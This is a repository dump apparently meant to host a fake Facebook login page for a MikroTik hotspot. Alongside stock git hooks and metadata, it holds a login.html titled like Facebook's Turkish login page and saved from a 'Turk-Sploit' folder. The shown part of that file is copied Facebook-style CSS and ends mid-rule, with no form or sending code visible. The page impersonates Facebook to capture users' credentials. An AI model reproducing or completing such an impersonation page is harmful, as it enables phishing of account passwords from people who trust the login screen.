# Repository Information
Name: Mikrotik_Facebook_Login_Panel

# Directory Structure
Directory structure:
└── github_repos/Mikrotik_Facebook_Login_Panel/
    │   ├── config
    │   ├── description
    │   ├── HEAD
    │   ├── hooks/
    │   │   ├── applypatch-msg.sample
    │   │   ├── commit-msg.sample
    │   │   ├── fsmonitor-watchman.sample
    │   │   ├── post-update.sample
    │   │   ├── pre-applypatch.sample
    │   │   ├── pre-commit.sample
    │   │   ├── pre-merge-commit.sample
    │   │   ├── pre-push.sample
    │   │   ├── pre-rebase.sample
    │   │   ├── pre-receive.sample
    │   │   ├── prepare-commit-msg.sample
    │   │   ├── push-to-checkout.sample
    │   │   └── update.sample
    │   ├── index
    │   ├── info/
    │   │   └── exclude
    │   ├── logs/
    │   │   ├── HEAD
    │   │   └── refs/
    │   │       ├── heads/
    │   │       │   └── master
    │   │       └── remotes/
    │   │           └── origin/
    │   │               └── HEAD
    │   ├── objects/
    │   │   ├── info/
    │   │   └── pack/
    │   │       ├── pack-a014a9b0016cd5b7e080485b167e0afedc833fb7.idx
    │   │       └── pack-a014a9b0016cd5b7e080485b167e0afedc833fb7.pack
    │   ├── packed-refs
    │   └── refs/
    │       ├── heads/
    │       │   └── master
    │       ├── remotes/
    │       │   └── origin/
    │       │       └── HEAD
    │       └── tags/
    ├── login.html
    └── login_files/


# Content
File: /.git\config
[core]
	repositoryformatversion = 0
	filemode = false
	bare = false
	logallrefupdates = true
	symlinks = false
	ignorecase = true
[remote "origin"]
	url = https://github.com/CypTeR/Mikrotik_Facebook_Login_Panel.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master


File: /.git\description
Unnamed repository; edit this file 'description' to name the repository.


File: /.git\HEAD
ref: refs/heads/master


File: /.git\hooks\applypatch-msg.sample
#!/bin/sh
#
# An example hook script to check the commit log message taken by
# applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.  The hook is
# allowed to edit the commit message file.
#
# To enable this hook, rename this file to "applypatch-msg".

. git-sh-setup
commitmsg="$(git rev-parse --git-path hooks/commit-msg)"
test -x "$commitmsg" && exec "$commitmsg" ${1+"$@"}
:


File: /.git\hooks\commit-msg.sample
#!/bin/sh
#
# An example hook script to check the commit log message.
# Called by "git commit" with one argument, the name of the file
# that has the commit message.  The hook should exit with non-zero
# status after issuing an appropriate message if it wants to stop the
# commit.  The hook is allowed to edit the commit message file.
#
# To enable this hook, rename this file to "commit-msg".

# Uncomment the below to add a Signed-off-by line to the message.
# Doing this in a hook is a bad idea in general, but the prepare-commit-msg
# hook is more suited to it.
#
# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# grep -qs "^$SOB" "$1" || echo "$SOB" >> "$1"

# This example catches duplicate Signed-off-by lines.

test "" = "$(grep '^Signed-off-by: ' "$1" |
	 sort | uniq -c | sed -e '/^[ 	]*1[ 	]/d')" || {
	echo >&2 Duplicate Signed-off-by lines.
	exit 1
}


File: /.git\hooks\fsmonitor-watchman.sample
#!/usr/bin/perl

use strict;
use warnings;
use IPC::Open2;

# An example hook script to integrate Watchman
# (https://facebook.github.io/watchman/) with git to speed up detecting
# new and modified files.
#
# The hook is passed a version (currently 2) and last update token
# formatted as a string and outputs to stdout a new update token and
# all files that have been modified since the update token. Paths must
# be relative to the root of the working tree and separated by a single NUL.
#
# To enable this hook, rename this file to "query-watchman" and set
File: /.git\hooks\post-update.sample
#!/bin/sh
#
# An example hook script to prepare a packed repository for use over
# dumb transports.
#
# To enable this hook, rename this file to "post-update".

exec git update-server-info


File: /.git\hooks\pre-applypatch.sample
#!/bin/sh
#
# An example hook script to verify what is about to be committed
# by applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-applypatch".

. git-sh-setup
precommit="$(git rev-parse --git-path hooks/pre-commit)"
test -x "$precommit" && exec "$precommit" ${1+"$@"}
:


File: /.git\hooks\pre-commit.sample
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message if
# it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-commit".

if git rev-parse --verify HEAD >/dev/null 2>&1
then
	against=HEAD
else
	# Initial commit: diff against an empty tree object
	against=$(git hash-object -t tree /dev/null)
fi

# If you want to allow non-ASCII filenames set this variable to true.
allownonascii=$(git config --type=bool hooks.allownonascii)

# Redirect output to stderr.
exec 1>&2

# Cross platform projects tend to avoid non-ASCII filenames; prevent
# them from being added to the repository. We exploit the fact that the
# printable range starts at the space character and ends with tilde.
if [ "$allownonascii" != "true" ] &&
	# Note that the use of brackets around a tr range is ok here, (it's
	# even required, for portability to Solaris 10's /usr/bin/tr), since
	# the square bracket bytes happen to fall in the designated range.
	test $(git diff --cached --name-only --diff-filter=A -z $against |
	  LC_ALL=C tr -d '[ -~]\0' | wc -c) != 0
then
	cat <<\EOF
Error: Attempt to add a non-ASCII file name.

This can cause problems if you want to work with people on other platforms.

To be portable it is advisable to rename the file.

If you know what you are doing you can disable this check using:

  git config hooks.allownonascii true
EOF
	exit 1
fi

# If there are whitespace errors, print the offending file names and fail.
exec git diff-index --check --cached $against --


File: /.git\hooks\pre-merge-commit.sample
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git merge" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message to
# stderr if it wants to stop the merge commit.
#
# To enable this hook, rename this file to "pre-merge-commit".

. git-sh-setup
test -x "$GIT_DIR/hooks/pre-commit" &&
        exec "$GIT_DIR/hooks/pre-commit"
:


File: /.git\hooks\pre-push.sample
#!/bin/sh

# An example hook script to verify what is about to be pushed.  Called by "git
# push" after it has checked the remote status, but before anything has been
# pushed.  If this script exits with a non-zero status nothing will be pushed.
#
# This hook is called with the following parameters:
#
# $1 -- Name of the remote to which the push is being done
# $2 -- URL to which the push is being done
#
# If pushing without using a named remote those arguments will be equal.
#
# Information about the commits which are being pushed is supplied as lines to
# the standard input in the form:
#
#   <local ref> <local oid> <remote ref> <remote oid>
#
# This sample shows how to prevent push of commits where the log message starts
# with "WIP" (work in progress).

remote="$1"
url="$2"

zero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')

while read local_ref local_oid remote_ref remote_oid
do
	if test "$local_oid" = "$zero"
	then
		# Handle delete
		:
	else
		if test "$remote_oid" = "$zero"
		then
			# New branch, examine all commits
			range="$local_oid"
		else
			# Update to existing branch, examine new commits
			range="$remote_oid..$local_oid"
		fi

		# Check for WIP commit
		commit=$(git rev-list -n 1 --grep '^WIP' "$range")
		if test -n "$commit"
		then
			echo >&2 "Found WIP commit in $local_ref, not pushing"
			exit 1
		fi
	fi
done

exit 0


File: /.git\hooks\pre-rebase.sample
#!/bin/sh
#
# Copyright (c) 2006, 2008 Junio C Hamano
#
# The "pre-rebase" hook is run just before "git rebase" starts doing
# its job, and can prevent the command from running by exiting with
# non-zero status.
#
# The hook is called with the following parameters:
#
# $1 -- the upstream the series was forked from.
# $2 -- the branch being rebased (or empty when rebasing the current branch).
#
# This sample shows how to prevent topic branches that are already
# merged to 'next' branch from getting rebased, because allowing it
# would result in rebasing already published history.

publish=next
basebranch="$1"
if test "$#" = 2
then
	topic="refs/heads/$2"
else
	topic=`git symbolic-ref HEAD` ||
	exit 0 ;# we do not interrupt rebasing detached HEAD
fi

case "$topic" in
refs/heads/??/*)
	;;
*)
	exit 0 ;# we do not interrupt others.
	;;
esac

# Now we are dealing with a topic branch being rebased
# on top of master.  Is it OK to rebase it?

# Does the topic really exist?
git show-ref -q "$topic" || {
	echo >&2 "No such branch $topic"
	exit 1
}

# Is topic fully merged to master?
not_in_master=`git rev-list --pretty=oneline ^master "$topic"`
if test -z "$not_in_master"
then
	echo >&2 "$topic is fully merged to master; better remove it."
	exit 1 ;# we could allow it, but there is no point.
fi

# Is topic ever merged to next?  If so you should not be rebasing it.
only_next_1=`git rev-list ^master "^$topic" ${publish} | sort`
only_next_2=`git rev-list ^master           ${publish} | sort`
if test "$only_next_1" = "$only_next_2"
then
	not_in_topic=`git rev-list "^$topic" master`
	if test -z "$not_in_topic"
	then
		echo >&2 "$topic is already up to date with master"
		exit 1 ;# we could allow it, but there is no point.
	else
		exit 0
	fi
else
	not_in_next=`git rev-list --pretty=oneline ^${publish} "$topic"`
	/usr/bin/perl -e '
		my $topic = $ARGV[0];
		my $msg = "* $topic has commits already merged to public branch:\n";
		my (%not_in_next) = map {
			/^([0-9a-f]+) /;
			($1 => 1);
		} split(/\n/, $ARGV[1]);
		for my $elem (map {
				/^([0-9a-f]+) (.*)$/;
				[$1 => $2];
			} split(/\n/, $ARGV[2])) {
			if (!exists $not_in_next{$elem->[0]}) {
				if ($msg) {
					print STDERR $msg;
					undef $msg;
				}
				print STDERR " $elem->[1]\n";
			}
		}
	' "$topic" "$not_in_next" "$not_in_master"
	exit 1
fi

<<\DOC_END

This sample hook safeguards topic branches that have been
published from being rewound.

The workflow assumed here is:

 * Once a topic branch forks from "master", "master" is never
   merged into it again (either directly or indirectly).

 * Once a topic branch is fully cooked and merged into "master",
   it is deleted.  If you need to build on top of it to correct
   earlier mistakes, a new topic branch is created by forking at
   the tip of the "master".  This is not strictly necessary, but
   it makes it easier to keep your history simple.

 * Whenever you need to test or publish your changes to topic
   branches, merge them into "next" branch.

The script, being an example, hardcodes the publish branch name
to be "next", but it is trivial to make it configurable via
$GIT_DIR/config mechanism.

With this workflow, you would want to know:

(1) ... if a topic branch has ever been merged to "next".  Young
    topic branches can have stupid mistakes you would rather
    clean up before publishing, and things that have not been
    merged into other branches can be easily rebased without
    affecting other people.  But once it is published, you would
    not want to rewind it.

(2) ... if a topic branch has been fully merged to "master".
    Then you can delete it.  More importantly, you should not
    build on top of it -- other people may already want to
    change things related to the topic as patches against your
    "master", so if you need further changes, it is better to
    fork the topic (perhaps with the same name) afresh from the
    tip of "master".

Let's look at this example:

		   o---o---o---o---o---o---o---o---o---o "next"
		  /       /           /           /
		 /   a---a---b A     /           /
		/   /               /           /
	       /   /   c---c---c---c B         /
	      /   /   /             \         /
	     /   /   /   b---b C     \       /
	    /   /   /   /             \     /
    ---o---o---o---o---o---o---o---o---o---o---o "master"


A, B and C are topic branches.

 * A has one fix since it was merged up to "next".

 * B has finished.  It has been fully merged up to "master" and "next",
   and is ready to be deleted.

 * C has not merged to "next" at all.

We would want to allow C to be rebased, refuse A, and encourage
B to be deleted.

To compute (1):

	git rev-list ^master ^topic next
	git rev-list ^master        next

	if these match, topic has not merged in next at all.

To compute (2):

	git rev-list master..topic

	if this is empty, it is fully merged to "master".

DOC_END


File: /.git\hooks\pre-receive.sample
#!/bin/sh
#
# An example hook script to make use of push options.
# The example simply echoes all push options that start with 'echoback='
# and rejects all pushes when the "reject" push option is used.
#
# To enable this hook, rename this file to "pre-receive".

if test -n "$GIT_PUSH_OPTION_COUNT"
then
	i=0
	while test "$i" -lt "$GIT_PUSH_OPTION_COUNT"
	do
		eval "value=\$GIT_PUSH_OPTION_$i"
		case "$value" in
		echoback=*)
			echo "echo from the pre-receive-hook: ${value#*=}" >&2
			;;
		reject)
			exit 1
		esac
		i=$((i + 1))
	done
fi


File: /.git\hooks\prepare-commit-msg.sample
#!/bin/sh
#
# An example hook script to prepare the commit log message.
# Called by "git commit" with the name of the file that has the
# commit message, followed by the description of the commit
# message's source.  The hook's purpose is to edit the commit
# message file.  If the hook fails with a non-zero status,
# the commit is aborted.
#
# To enable this hook, rename this file to "prepare-commit-msg".

# This hook includes three examples. The first one removes the
# "# Please enter the commit message..." help message.
#
# The second includes the output of "git diff --name-status -r"
# into the message, just before the "git status" output.  It is
# commented because it doesn't cope with --amend or with squashed
# commits.
#
# The third example adds a Signed-off-by line to the message, that can
# still be edited.  This is rarely a good idea.

COMMIT_MSG_FILE=$1
COMMIT_SOURCE=$2
SHA1=$3

/usr/bin/perl -i.bak -ne 'print unless(m/^. Please enter the commit message/..m/^#$/)' "$COMMIT_MSG_FILE"

# case "$COMMIT_SOURCE,$SHA1" in
#  ,|template,)
#    /usr/bin/perl -i.bak -pe '
#       print "\n" . `git diff --cached --name-status -r`
# 	 if /^#/ && $first++ == 0' "$COMMIT_MSG_FILE" ;;
#  *) ;;
# esac

# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# git interpret-trailers --in-place --trailer "$SOB" "$COMMIT_MSG_FILE"
# if test -z "$COMMIT_SOURCE"
# then
#   /usr/bin/perl -i.bak -pe 'print "\n" if !$first_line++' "$COMMIT_MSG_FILE"
# fi


File: /.git\hooks\push-to-checkout.sample
#!/bin/sh

# An example hook script to update a checked-out tree on a git push.
#
# This hook is invoked by git-receive-pack(1) when it reacts to git
# push and updates reference(s) in its repository, and when the push
# tries to update the branch that is currently checked out and the
# receive.denyCurrentBranch configuration variable is set to
# updateInstead.
#
# By default, such a push is refused if the working tree and the index
# of the remote repository has any difference from the currently
# checked out commit; when both the working tree and the index match
# the current commit, they are updated to match the newly pushed tip
# of the branch. This hook is to be used to override the default
# behaviour; however the code below reimplements the default behaviour
# as a starting point for convenient modification.
#
# The hook receives the commit with which the tip of the current
# branch is going to be updated:
commit=$1

# It can exit with a non-zero status to refuse the push (when it does
# so, it must not modify the index or the working tree).
die () {
	echo >&2 "$*"
	exit 1
}

# Or it can make any necessary changes to the working tree and to the
# index to bring them to the desired state when the tip of the current
# branch is updated to the new commit, and exit with a zero status.
#
# For example, the hook can simply run git read-tree -u -m HEAD "$1"
# in order to emulate git fetch that is run in the reverse direction
# with git push, as the two-tree form of git read-tree -u -m is
# essentially the same as git switch or git checkout that switches
# branches while keeping the local changes in the working tree that do
# not interfere with the difference between the branches.

# The below is a more-or-less exact translation to shell of the C code
# for the default behaviour for git's push-to-checkout hook defined in
# the push_to_deploy() function in builtin/receive-pack.c.
#
# Note that the hook will be executed from the repository directory,
# not from the working tree, so if you want to perform operations on
# the working tree, you will have to adapt your code accordingly, e.g.
# by adding "cd .." or using relative paths.

if ! git update-index -q --ignore-submodules --refresh
then
	die "Up-to-date check failed"
fi

if ! git diff-files --quiet --ignore-submodules --
then
	die "Working directory has unstaged changes"
fi

# This is a rough translation of:
#
#   head_has_history() ? "HEAD" : EMPTY_TREE_SHA1_HEX
if git cat-file -e HEAD 2>/dev/null
then
	head=HEAD
else
	head=$(git hash-object -t tree --stdin </dev/null)
fi

if ! git diff-index --quiet --cached --ignore-submodules $head --
then
	die "Working directory has staged changes"
fi

if ! git read-tree -u -m "$commit"
then
	die "Could not update working tree to new HEAD"
fi


File: /.git\hooks\update.sample
#!/bin/sh
#
# An example hook script to block unannotated tags from entering.
# Called by "git receive-pack" with arguments: refname sha1-old sha1-new
#
# To enable this hook, rename this file to "update".
#
# Config
# ------
# hooks.allowunannotated
#   This boolean sets whether unannotated tags will be allowed into the
#   repository.  By default they won't be.
# hooks.allowdeletetag
#   This boolean sets whether deleting tags will be allowed in the
#   repository.  By default they won't be.
# hooks.allowmodifytag
#   This boolean sets whether a tag may be modified after creation. By default
#   it won't be.
# hooks.allowdeletebranch
#   This boolean sets whether deleting branches will be allowed in the
#   repository.  By default they won't be.
# hooks.denycreatebranch
#   This boolean sets whether remotely creating branches will be denied
#   in the repository.  By default this is allowed.
#

# --- Command line
refname="$1"
oldrev="$2"
newrev="$3"

# --- Safety check
if [ -z "$GIT_DIR" ]; then
	echo "Don't run this script from the command line." >&2
	echo " (if you want, you could supply GIT_DIR then run" >&2
	echo "  $0 <ref> <oldrev> <newrev>)" >&2
	exit 1
fi

if [ -z "$refname" -o -z "$oldrev" -o -z "$newrev" ]; then
	echo "usage: $0 <ref> <oldrev> <newrev>" >&2
	exit 1
fi

# --- Config
allowunannotated=$(git config --type=bool hooks.allowunannotated)
allowdeletebranch=$(git config --type=bool hooks.allowdeletebranch)
denycreatebranch=$(git config --type=bool hooks.denycreatebranch)
allowdeletetag=$(git config --type=bool hooks.allowdeletetag)
allowmodifytag=$(git config --type=bool hooks.allowmodifytag)

# check for no description
projectdesc=$(sed -e '1q' "$GIT_DIR/description")
case "$projectdesc" in
"Unnamed repository"* | "")
	echo "*** Project description file hasn't been set" >&2
	exit 1
	;;
esac

# --- Check types
# if $newrev is 0000...0000, it's a commit to delete a ref.
zero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')
if [ "$newrev" = "$zero" ]; then
	newrev_type=delete
else
	newrev_type=$(git cat-file -t $newrev)
fi

case "$refname","$newrev_type" in
	refs/tags/*,commit)
		# un-annotated tag
		short_refname=${refname##refs/tags/}
		if [ "$allowunannotated" != "true" ]; then
			echo "*** The un-annotated tag, $short_refname, is not allowed in this repository" >&2
			echo "*** Use 'git tag [ -a | -s ]' for tags you want to propagate." >&2
			exit 1
		fi
		;;
	refs/tags/*,delete)
		# delete tag
		if [ "$allowdeletetag" != "true" ]; then
			echo "*** Deleting a tag is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/tags/*,tag)
		# annotated tag
		if [ "$allowmodifytag" != "true" ] && git rev-parse $refname > /dev/null 2>&1
		then
			echo "*** Tag '$refname' already exists." >&2
			echo "*** Modifying a tag is not allowed in this repository." >&2
			exit 1
		fi
		;;
	refs/heads/*,commit)
		# branch
		if [ "$oldrev" = "$zero" -a "$denycreatebranch" = "true" ]; then
			echo "*** Creating a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/heads/*,delete)
		# delete branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/remotes/*,commit)
		# tracking branch
		;;
	refs/remotes/*,delete)
		# delete tracking branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a tracking branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	*)
		# Anything else (is there anything else?)
		echo "*** Update hook: unknown type of update to ref $refname of type $newrev_type" >&2
		exit 1
		;;
esac

# --- Finished
exit 0


File: /.git\info\exclude
File: /.git\logs\HEAD
0000000000000000000000000000000000000000 a21d02da70538a89ea568bb5ff03a192530acc6e vivek-dodia <vivek.dodia@icloud.com> 1738606368 -0500	clone: from https://github.com/CypTeR/Mikrotik_Facebook_Login_Panel.git


File: /.git\logs\refs\heads\master
0000000000000000000000000000000000000000 a21d02da70538a89ea568bb5ff03a192530acc6e vivek-dodia <vivek.dodia@icloud.com> 1738606368 -0500	clone: from https://github.com/CypTeR/Mikrotik_Facebook_Login_Panel.git


File: /.git\logs\refs\remotes\origin\HEAD
0000000000000000000000000000000000000000 a21d02da70538a89ea568bb5ff03a192530acc6e vivek-dodia <vivek.dodia@icloud.com> 1738606368 -0500	clone: from https://github.com/CypTeR/Mikrotik_Facebook_Login_Panel.git


File: /.git\packed-refs
# pack-refs with: peeled fully-peeled sorted 
a21d02da70538a89ea568bb5ff03a192530acc6e refs/remotes/origin/master


File: /.git\refs\heads\master
a21d02da70538a89ea568bb5ff03a192530acc6e


File: /.git\refs\remotes\origin\HEAD
ref: refs/remotes/origin/master


File: /login.html
<!DOCTYPE html>
<!-- saved from url=(0068)file:///C:/Users/Mc%20Mikail..!/Desktop/Turk-Sploit/flash/login.html -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Facebook'a Giriş Yap | Facebook</title><link href="file:///C:/Users/Mc%20Mikail..!/Desktop/Turk-Sploit/flash/login_files/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196">
<style type="text/css">
element.style {
	min-height:611px;
	background-color:#FFF
	}
	
body.touch {
    margin: 0;
    
    cursor: pointer;
}
.touch, .touch .btn, .touch .input, .touch button, .touch input, .touch select, .touch textarea {
    -webkit-tap-highlight-color: rgba(0,0,0,0);
}
.touch, .touch td, .touch input, .touch textarea .touch button {
    font-family: Helvetica, Arial, sans-serif;
    font-size: 14px;
}
.touch, .touch tr, .touch input, .touch textarea, .touch .mfsm {
   
    line-height: 18px;
}
.acw {
    border-color: #e9e9e9;
}
body, p, figure, h1, h2, h3, h4, h5, h6, ul, ol, li, dl, dd, dt {
    
    padding: 0;
}
body {
    text-align: left;
    direction: ltr;
}
body {
    display: block;
}
._56bs._56b_ {
    display: block;
    width: 100%;
}
.touch ._56bu, .touch ._56bv, .touch a._56bu, .touch a._56bv {
    text-shadow: 0 -1px rgba(0, 0, 0, .25);
}
.touch ._56bs {
    border: none;
    border-radius: 3px;
    box-sizing: border-box;
    position: relative;
    z-index: 0;
}
.touch, .touch .btn, .touch .input, .touch button, .touch input, .touch select, .touch textarea {
    -webkit-tap-highlight-color: rgba(0,0,0,0);
}
._56bw {
    font-size: 14px;
    height: 36px;
    line-height: 36px;
    padding: 0 16px;
}
._56bu, ._56bv, a._56bu, a._56bv, .touch a._56bu, .touch a._56bv, a.touchable._56bu, a.touchable._56bv {
    color: #fff;
}
._56bs {
    -webkit-appearance: none;
    background: none;
    margin: 0;
    overflow: visible;
    text-align: center;
    vertical-align: top;
    white-space: nowrap;
}
._52jh {
    font-weight: bold;
}
body, tr, input, textarea, button {
    font-family: sans-serif;
}
button {
    -webkit-writing-mode: horizontal-tb !important;
    text-rendering: auto;
    letter-spacing: normal;
    word-spacing: normal;
    text-transform: none;
    text-indent: 0px;
    align-items: flex-start;
    cursor: default;
    font: 400 13.3333px Arial;
}
body {
    direction: ltr;
}
.touch ._5soa ._28lf::before {
    background-color: #1877f2;
    background-image: none;
}
.touch ._56bs::before, .touch.wp.x1-5 ._56bs::before, .touch.wp.x2 ._56bs::before {
    border-radius: 4px;
    bottom: -1px;
    content: "";
    left: -1px;
    pointer-events: none;
    position: absolute;
    right: -1px;
    top: -1px;
    transform: none;
    z-index: -1;
}
html .touch ._5soa ._28lf::after {
    border-image: none;
    border-width: 0;
}
.touch ._56bu::after, .touch ._56bv::after, .touch.wp.x1-5 ._56bu::after, .touch.wp.x1-5 ._56bv::after, .touch.wp.x2 ._56bu::after, .touch.wp.x2 ._56bv::after {
    border-color: rgba(0, 0, 0, .15) rgba(0, 0, 0, .15) rgba(0, 0, 0, .26);
    box-shadow: 0 1px 0 rgba(0, 0, 0, .14), inset 0 -1px 1px 0 rgba(0,0,0,.03);
}
.touch ._56bs::after, .touch.wp.x1-5 ._56bs::after, .touch.wp.x2 ._56bs::after {
    border-radius: 4px;
    border-style: solid;
    bottom: -1px;
    content: "";
    left: -1px;
    pointer-events: none;
    position: absolute;
    right: -1px;
    top: -1px;
    z-index: 1;
}
._52z6 {
    min-width: 100px;
    text-align: center;
}
.touch a {
    color: #576b95;
    cursor: pointer;
    text-decoration: none;
}
i {
    font-style: italic;
}
.img {
    border: 0;
    vertical-align: top;
}
.sp_r1kll-jZ9y4 {
    background-image: url(login_files/XUEnP94XWKH.png);
    background-size: auto;
    background-repeat: no-repeat;
    display: inline-block;
}
.sp_r1kll-jZ9y4.sx_871d9c {
	width: 123px;
	height: 24px;
	background-position: 0 0;
	background-image: url(login_files/XUEnP94XWKH.png);
}
body.touch {
    margin: 0;}
	.touch, .touch .btn, .touch .input, .touch button, .touch input, .touch select, .touch textarea {
    -webkit-tap-highlight-color: rgba(0,0,0,0);
}
.touch, .touch td, .touch input, .touch textarea .touch button {
    font-family: Helvetica, Arial, sans-serif;
    font-size: 14px;
}
.touch, .touch tr, .touch input, .touch textarea, .touch .mfsm {
    line-height: 18px;
}
.touch ._5t3b>._5t3c::before {
    background-color: #46a800;
    border-color: #60a62e #519f18 #409701;
}
.touch ._5t3b>._28le::before {
    background-color: #00a400;
    border: none;
}
.touch, .touch td, .touch input, .touch textarea .touch button {
    font-size: 14px;
}
.btn {
    margin: 0;
    text-align: center;
}
.touch a {
    cursor: pointer;
    text-decoration: none;
}
.touch .btn {
    border-radius: 4px;
    box-sizing: border-box;
    display: inline-block;
    font-weight: bold;
    min-width: 50px;
    overflow: hidden;
    text-overflow: ellipsis;
    vertical-align: bottom;
    white-space: nowrap;
}
.touch .btn.btnD.bgb, .touch .btn.btnC, .touch .btn.btnI.bgb, .touch .btn.btnS, .touch .btn.btnN {
    color: #fff;
    text-shadow: 0 -1px 0 rgba(0, 0, 0, .35);
}
html .touch ._5soa ._28le {
    background: #00a400;
    border: none;
    box-shadow: none;
}
.touch ._5t3b a._5t3c {
    height: 36px;
    padding-left: 16px;
    padding-right: 16px;
    padding-top: 5px;
}
.touch .apm {
    padding: 5px 8px;
}
.acy {
    background-color: #fffbe2;
    color: #7f7212;
}
.acy {
    border-color: #e2c822;
}
.abb {
    border-bottom: 1px solid;
}
user agent stylesheet
div {
    display: block;
}
body.touch {
    margin: 0;
    cursor: pointer;
}
.touch, .touch .btn, .touch .input, .touch button, .touch input, .touch select, .touch textarea {
    -webkit-tap-highlight-color: rgba(0,0,0,0);
}
.touch, .touch td, .touch input, .touch textarea .touch button {
    font-family: Helvetica, Arial, sans-serif;
    font-size: 14px;
}
.touch, .touch tr, .touch input, .touch textarea, .touch .mfsm {
    line-height: 18px;
}
.touch ._52we {
    align-items: center;
}
.touch ._7om2 {
    display: -webkit-flex;
}
._52z5, ._rqm {
    padding-left: env(safe-area-inset-left);
    padding-right: env(safe-area-inset-right);
}
._52z5 {
    background: #3b5998;
    box-sizing: border-box;
    height: 44px;
    margin: 0 auto;
    padding: 0;
    position: relative;
    width: 100%;
    z-index: 12;
}
body.touch {
    margin: 0;
    cursor: pointer;
}
.touch, .touch .btn, .touch .input, .touch button, .touch input, .touch select, .touch textarea {
    -webkit-tap-highlight-color: rgba(0,0,0,0);
}
.touch, .touch td, .touch input, .touch textarea .touch button {
    font-family: Helvetica, Arial, sans-serif;
    font-size: 14px;
}
.touch, .touch tr, .touch input, .touch textarea, .touch .mfsm {
    line-height: 18px;
}
body {
    text-align: left;
    direction: ltr;
}
._5soa ._5rut {
    padding: 0 16px;
}

.touch ._5rut {
    margin: 0 auto;
    max-width: 416px;
}
user agent stylesheet
div {
    display: block;
}
body.touch {
    margin: 0;
    cursor: pointer;
}
.touch, .touch .btn, .touch .input, .touch button, .touch input, .touch select, .touch textarea {
    -webkit-tap-highlight-color: rgba(0,0,0,0);
}
.touch, .touch td, .touch input, .touch textarea .touch button {
    font-family: Helvetica, Arial, sans-serif;
    font-size: 14px;
}
.touch, .touch tr, .touch input, .touch textarea, .touch .mfsm {
    line-height: 18px;
}
div {
    display: block;
}
body.touch {
    margin: 0;
    cursor: pointer;
}
.touch, .touch .btn, .touch .input, .touch button, .touch input, .touch select, .touch textarea {
    -webkit-tap-highlight-color: rgba(0,0,0,0);
}
.touch, .touch td, .touch input, .touch textarea .touch button {
    font-family: Helvetica, Arial, sans-serif;
    font-size: 14px;
}
.touch, .touch tr, .touch input, .touch textarea, .touch .mfsm {
    line-height: 18px;
}
body {
    text-align: left;
    direction: ltr;
}

element.style {
    min-height: 611px;
    background-color: rgb(255, 255, 255);
}
body.touch {
    margin: 0;
    cursor: pointer;
}
.touch, .touch .btn, .touch .input, .touch button, .touch input, .touch select, .touch textarea {
    -webkit-tap-highlight-color: rgba(0,0,0,0);
}
.touch, .touch td, .touch input, .touch textarea .touch button {
    font-family: Helvetica, Arial, sans-serif;
    font-size: 14px;
}
.touch, .touch tr, .touch input, .touch textarea, .touch .mfsm {
    line-height: 18px;
}
.acw {
    background-color: #fff;
}
.acw {
    border-color: #e9e9e9;
}
body, p, figure, h1, h2, h3, h4, h5, h6, ul, ol, li, dl, dd, dt {
    padding: 0;
}
.touch ._4g34 {
    flex: 1;
    min-width: 0;
    width: 0;
}
._52z6 {
    text-align: center;
}
user agent stylesheet
div {
    display: block;
}
body.touch {
    margin: 0;
    cursor: pointer;
}
.touch, .touch .btn, .touch .input, .touch button, .touch input, .touch select, .touch textarea {
    -webkit-tap-highlight-color: rgba(0,0,0,0);
}
.touch, .touch td, .touch input, .touch textarea .touch button {
    font-family: Helvetica, Arial, sans-serif;
    font-size: 14px;
}
.touch, .touch .btn, .touch .input, .touch button, .touch input, .touch select, .touch textarea {
    -webkit-tap-highlight-color: rgba(0,0,0,0);
}
._5spm {
    padding-bottom: 1px;
    padding-top: 16px;
}
form {
    margin: 0;
    border: 0;
}
user agent stylesheet
form {
    display: block;
}
.touch ._4u9z {
    padding: 12px;
}
.touch ._56bg {
    -webkit-appearance: none;
    box-sizing: border-box;
    width: 100%;
}

.touch, .touch .btn, .touch .input, .touch button, .touch input, .touch select, .touch textarea {
    -webkit-tap-highlight-color: rgba(0,0,0,0);
}
.touch, .touch td, .touch input, .touch textarea .touch button {
    font-family: Helvetica, Arial, sans-serif;
    font-size: 14px;
}
.touch, .touch tr, .touch input, .touch textarea, .touch .mfsm {
    line-height: 18px;
}
._8qtn {
    background: #f5f6f7;
}
._56bg {
    border: 0;
    display: block;
    margin: 0;
}

input {
    -webkit-writing-mode: horizontal-tb !important;
    text-rendering: auto;
    color: -internal-light-dark-color(black, white);
    letter-spacing: normal;
    word-spacing: normal;
    text-transform: none;
    text-indent: 0px;
    text-shadow: none;

    text-align: start;
    
    -webkit-rtl-ordering: logical;
    cursor: text;

    font: 400 13.3333px Arial;}
	._8qtf {
    margin: 12px 0 14px 0;
    width: 100%;
}
._43mg {
    display: block;
    overflow: hidden;
    text-align: center;
    white-space: nowrap;
}
._5t3b {
    padding: 12px 0 12px 0;
}
._52jj {
    text-align: center;
}
._52z6 {
    min-width: 100px;
    text-align: center;
}
.sp_r1kll-jZ9y4.sx_871d9c {
    width: 123px;
    height: 24px;
    background-position: 0 0;
}


.sp_r1kll-jZ9y4 {
    background-image: url(/rsrc.php/v3/y3/r/XUEnP94XWKH.png);
    background-size: auto;
    background-repeat: no-repeat;
    display: inline-block;

}
.img {
    border: 0;
    vertical-align: top;
